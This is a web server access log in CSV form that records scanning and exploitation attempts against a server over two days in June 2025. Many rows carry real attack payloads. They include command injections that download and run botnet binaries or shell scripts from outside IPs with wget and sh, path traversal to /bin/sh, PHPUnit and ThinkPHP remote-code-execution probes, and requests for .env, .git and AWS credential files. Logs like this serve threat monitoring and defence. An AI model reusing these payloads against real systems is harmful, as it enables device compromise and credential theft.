ip,country,date,http_code,method,query
45.135.194.8,NL,2025-06-14,301,GET,/
204.76.203.212,NL,2025-06-14,301,GET,/
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
102.222.21.21,ZA,2025-06-14,301,POST,/boaform/admin/formLogin
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.208,NL,2025-06-14,405,PROPFIND,/
109.123.247.106,DE,2025-06-14,404,GET,/.env
104.234.115.238,CA,2025-06-14,301,GET,/
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
185.218.84.178,US,2025-06-14,301,GET,/
94.102.56.8,NL,2025-06-14,404,GET,/fapi/v1/ticker/bookTicker?symbol=BTCUSDT
45.135.194.8,NL,2025-06-14,301,GET,/
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.206,NL,2025-06-14,301,GET,/
185.242.226.14,US,2025-06-14,403,GET,/
209.38.27.18,AU,2025-06-14,301,GET,/.env
209.38.27.18,AU,2025-06-14,301,GET,/.git/config
144.172.103.59,US,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F15.235.149.59%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.212,NL,2025-06-14,301,GET,/
204.76.203.208,NL,2025-06-14,405,PROPFIND,/
43.130.106.18,US,2025-06-14,301,GET,/
43.130.106.18,US,2025-06-14,403,GET,/
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
185.218.84.178,US,2025-06-14,301,GET,/
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
20.98.137.225,US,2025-06-14,301,GET,/portal/redlion
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
79.124.58.198,BG,2025-06-14,403,GET,/?XDEBUG_SESSION_START=phpstorm
204.76.203.219,NL,2025-06-14,301,GET,/
196.251.83.25,SC,2025-06-14,404,GET,/.env
204.76.203.206,NL,2025-06-14,301,GET,/
86.107.101.21,US,2025-06-14,400,CONNECT,google.com:443
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
206.168.34.92,US,2025-06-14,403,GET,/
206.168.34.92,US,2025-06-14,404,GET,/favicon.ico
206.168.34.92,US,2025-06-14,404,GET,/robots.txt
206.168.34.92,US,2025-06-14,404,GET,/favicon.ico
196.251.71.232,SC,2025-06-14,404,GET,/.env
196.251.85.66,NL,2025-06-14,404,GET,/.c9/metadata/environment/.env
204.76.203.208,NL,2025-06-14,405,PROPFIND,/
196.251.71.232,SC,2025-06-14,404,GET,/.env
198.235.24.157,US,2025-06-14,403,GET,/
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
198.235.24.157,US,2025-06-14,403,GET,/
139.162.3.144,SG,2025-06-14,301,GET,/
139.162.3.144,SG,2025-06-14,403,GET,/
139.162.3.144,SG,2025-06-14,301,GET,/
139.162.3.144,SG,2025-06-14,403,GET,/
139.162.3.144,SG,2025-06-14,301,GET,/favicon.ico
139.162.3.144,SG,2025-06-14,404,GET,/favicon.ico
139.162.3.144,SG,2025-06-14,301,GET,/
139.162.3.144,SG,2025-06-14,301,GET,/
139.162.3.144,SG,2025-06-14,403,GET,/
139.162.3.144,SG,2025-06-14,403,GET,/
20.65.194.87,US,2025-06-14,301,GET,/
185.177.72.144,GB,2025-06-14,404,GET,/.git/HEAD
185.177.72.144,GB,2025-06-14,404,GET,/.aws/credentials
185.177.72.144,GB,2025-06-14,404,GET,/.AWS_/credentials
185.177.72.144,GB,2025-06-14,404,GET,/.env
185.177.72.144,GB,2025-06-14,404,GET,/.env.bak
185.177.72.144,GB,2025-06-14,404,GET,/.env.example
185.177.72.144,GB,2025-06-14,404,GET,/.env.local
185.177.72.144,GB,2025-06-14,404,GET,/.env.old
185.177.72.144,GB,2025-06-14,404,GET,/.env.production
185.177.72.144,GB,2025-06-14,200,GET,/?phpinfo=1
185.177.72.144,GB,2025-06-14,404,GET,/api/shared/config.env
185.177.72.144,GB,2025-06-14,404,GET,/app/.env
185.177.72.144,GB,2025-06-14,404,GET,/application.properties
185.177.72.144,GB,2025-06-14,404,GET,/appsettings.json
185.177.72.144,GB,2025-06-14,404,GET,/aws/credentials
185.177.72.144,GB,2025-06-14,404,GET,/config.env
185.177.72.144,GB,2025-06-14,404,GET,/config.json
185.177.72.144,GB,2025-06-14,404,GET,/config/aws.yml
185.177.72.144,GB,2025-06-14,404,GET,/config/settings.json
185.177.72.144,GB,2025-06-14,404,GET,/i.php
185.177.72.144,GB,2025-06-14,404,GET,/info.php
185.177.72.144,GB,2025-06-14,404,GET,/laravel/.env
185.177.72.144,GB,2025-06-14,404,GET,/p.php
185.177.72.144,GB,2025-06-14,404,GET,/phpinfo
185.177.72.144,GB,2025-06-14,404,GET,/phpinfo.php
185.177.72.144,GB,2025-06-14,404,GET,/_profiler/phpinfo
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
141.98.11.147,LT,2025-06-14,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.212,NL,2025-06-14,301,GET,/
185.218.84.178,US,2025-06-14,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
141.98.11.147,LT,2025-06-17,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
5.13.234.120,RO,2025-06-17,301,GET,/
103.130.212.158,VN,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
141.98.11.147,LT,2025-06-17,301,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3Bsh%20-c%20%22route%20add%20-host%20141.98.11.147%20reject%3B%20route%20add%20-host%20141.98.11.147%20gw%20141.98.11.147%22%3B%20wget%20http%3A%2F%2F94.26.90.251%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk
79.124.58.198,BG,2025-06-17,301,GET,/?XDEBUG_SESSION_START=phpstorm
79.124.58.198,BG,2025-06-17,403,GET,/?XDEBUG_SESSION_START=phpstorm
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.219,NL,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
196.251.117.9,NL,2025-06-17,404,GET,/.env
185.218.84.178,US,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
45.135.194.34,NL,2025-06-17,301,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.211%2Frondo.sh%29+%7C+sh+-s+tplink%3B)
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
185.12.59.118,NO,2025-06-17,400,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
20.65.194.168,US,2025-06-17,403,GET,/
196.251.70.87,SC,2025-06-17,404,GET,/.env
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
185.242.226.14,US,2025-06-17,403,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
152.32.145.64,JP,2025-06-17,403,GET,/
51.159.23.43,FR,2025-06-17,403,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
31.220.83.175,DE,2025-06-17,301,POST,/boaform/admin/formLogin
141.98.10.162,LT,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
98.81.245.104,US,2025-06-17,403,GET,/
173.15.33.166,US,2025-06-17,301,GET,/
3.86.110.145,US,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
165.154.36.91,US,2025-06-17,301,GET,/version
165.154.36.91,US,2025-06-17,301,GET,/
165.154.36.91,US,2025-06-17,301,GET,/
165.154.36.91,US,2025-06-17,301,GET,/v1
165.154.36.91,US,2025-06-17,301,GET,/
204.76.203.212,NL,2025-06-17,301,GET,/
43.166.132.142,US,2025-06-17,400,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
79.124.58.198,BG,2025-06-17,301,GET,/actuator/gateway/routes
79.124.58.198,BG,2025-06-17,404,GET,/actuator/gateway/routes
198.55.98.76,US,2025-06-17,404,GET,/.env
176.65.151.51,NL,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
185.218.84.178,US,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
207.167.64.24,US,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
51.159.23.43,FR,2025-06-17,403,GET,/
31.220.83.175,DE,2025-06-17,301,POST,/boaform/admin/formLogin
207.167.64.24,US,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
176.65.148.75,NL,2025-06-17,301,GET,/
170.39.218.2,CA,2025-06-17,400,GET,/
170.39.218.2,CA,2025-06-17,301,GET,/
170.39.218.2,CA,2025-06-17,301,GET,/.git/config
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
196.251.83.206,SC,2025-06-17,404,GET,/.env
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.219,NL,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
170.39.218.2,CA,2025-06-17,400,GET,/
170.39.218.2,CA,2025-06-17,403,GET,/
170.39.218.2,CA,2025-06-17,404,GET,/.git/config
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
135.233.112.24,US,2025-06-17,404,GET,/developmentserver/metadatauploader
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
23.26.80.245,JP,2025-06-17,301,GET,/shell?cd+/tmp;rm+-rf+*;wget+31.58.51.98/jaws;sh+/tmp/jaws
147.185.132.70,US,2025-06-17,301,GET,/
204.76.203.206,NL,2025-06-17,301,GET,/
20.80.82.220,US,2025-06-17,404,GET,/actuator/health
45.131.155.254,DE,2025-06-17,301,GET,/
34.78.212.118,BE,2025-06-17,301,GET,/
45.131.155.254,DE,2025-06-17,301,GET,/
165.22.218.218,IN,2025-06-17,404,GET,/.env
165.22.218.218,IN,2025-06-17,400,GET,/.env
165.22.218.218,IN,2025-06-17,404,GET,/.git/config
165.22.218.218,IN,2025-06-17,400,GET,/.git/config
204.76.203.212,NL,2025-06-17,301,GET,/
185.218.84.178,US,2025-06-17,301,GET,/
118.194.253.212,TW,2025-06-17,400,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
118.194.253.212,TW,2025-06-17,400,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
118.194.253.212,TW,2025-06-17,404,POST,/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
118.194.253.212,TW,2025-06-17,404,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/vendor/phpunit/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/phpunit/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/lib/phpunit/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
118.194.253.212,TW,2025-06-17,404,GET,/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
118.194.253.212,TW,2025-06-17,404,GET,/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
118.194.253.212,TW,2025-06-17,404,GET,/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php
118.194.253.212,TW,2025-06-17,404,GET,/index.php?lang=../../../../../../../../tmp/index1
118.194.253.212,TW,2025-06-17,404,GET,/containers/json
43.159.143.187,US,2025-06-17,301,GET,/
43.159.143.187,US,2025-06-17,403,GET,/
204.76.203.219,NL,2025-06-17,301,GET,/
170.39.218.2,CA,2025-06-17,400,GET,/
170.39.218.2,CA,2025-06-17,404,GET,/.git/config
45.156.130.6,PT,2025-06-17,403,GET,/
146.70.188.158,BG,2025-06-17,301,GET,/.git/config
146.70.188.158,BG,2025-06-17,404,GET,/.git/config
146.70.188.158,BG,2025-06-17,301,GET,/.aws/credentials
146.70.188.158,BG,2025-06-17,404,GET,/.aws/credentials
196.251.85.66,NL,2025-06-17,404,GET,/public/.env
120.61.28.240,IN,2025-06-17,301,GET,/boaform/admin/formLogin?username=adminisp&psd=adminisp
185.242.226.116,US,2025-06-17,301,GET,/
185.242.226.116,US,2025-06-17,403,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
185.218.84.178,US,2025-06-17,301,GET,/
47.106.187.235,CN,2025-06-17,301,HEAD,/mysql-admin/scripts/setup.php
47.106.187.235,CN,2025-06-17,404,HEAD,/mysql-admin/scripts/setup.php
47.106.187.235,CN,2025-06-17,301,HEAD,/phpMyAdmin/scripts/setup.php
45.135.194.34,NL,2025-06-17,301,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%29+%7C+sh+-s+tplink%3B)
45.131.155.254,DE,2025-06-17,403,GET,/
204.76.203.212,NL,2025-06-17,301,GET,/
203.188.164.163,NL,2025-06-17,403,GET,/
203.188.164.163,NL,2025-06-17,403,GET,/
94.102.56.8,NL,2025-06-17,404,GET,/fapi/v1/ticker/bookTicker?symbol=BTCUSDT
144.172.108.37,US,2025-06-17,301,POST,/cgi-bin/luci/;stok=/locale?form=country
205.210.31.92,US,2025-06-17,403,GET,/
176.65.148.75,NL,2025-06-17,301,GET,/
81.167.51.106,NO,2025-06-17,301,GET,/
185.218.84.178,US,2025-06-17,301,GET,/
157.230.111.16,DE,2025-06-17,301,GET,/.env
157.230.111.16,DE,2025-06-17,301,GET,/.git/config
204.76.203.219,NL,2025-06-17,301,GET,/
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
45.156.130.4,PT,2025-06-17,301,GET,/
45.156.130.46,PT,2025-06-17,403,GET,/
79.124.8.120,NL,2025-06-17,301,GET,/
198.235.24.227,US,2025-06-17,301,GET,/
198.235.24.227,US,2025-06-17,403,GET,/
204.76.203.212,NL,2025-06-17,301,GET,/
204.76.203.206,NL,2025-06-17,301,GET,/
144.172.101.110,US,2025-06-17,301,POST,/boaform/admin/formLogin
117.48.157.75,CN,2025-06-17,400,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
45.135.194.34,NL,2025-06-17,301,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(killall+-9+mipsel+mpsl%3B%28wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox+wget+-O-+http%3A%2F%2F14.103.145.202%2Frondo.sh%29+%7C+sh+-s+tplink%3B)
20.65.195.124,US,2025-06-17,301,GET,/developmentserver/metadatauploader
204.76.203.208,NL,2025-06-17,405,PROPFIND,/
185.218.84.178,US,2025-06-17,301,GET,/
48.217.87.78,US,2025-06-17,404,GET,/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
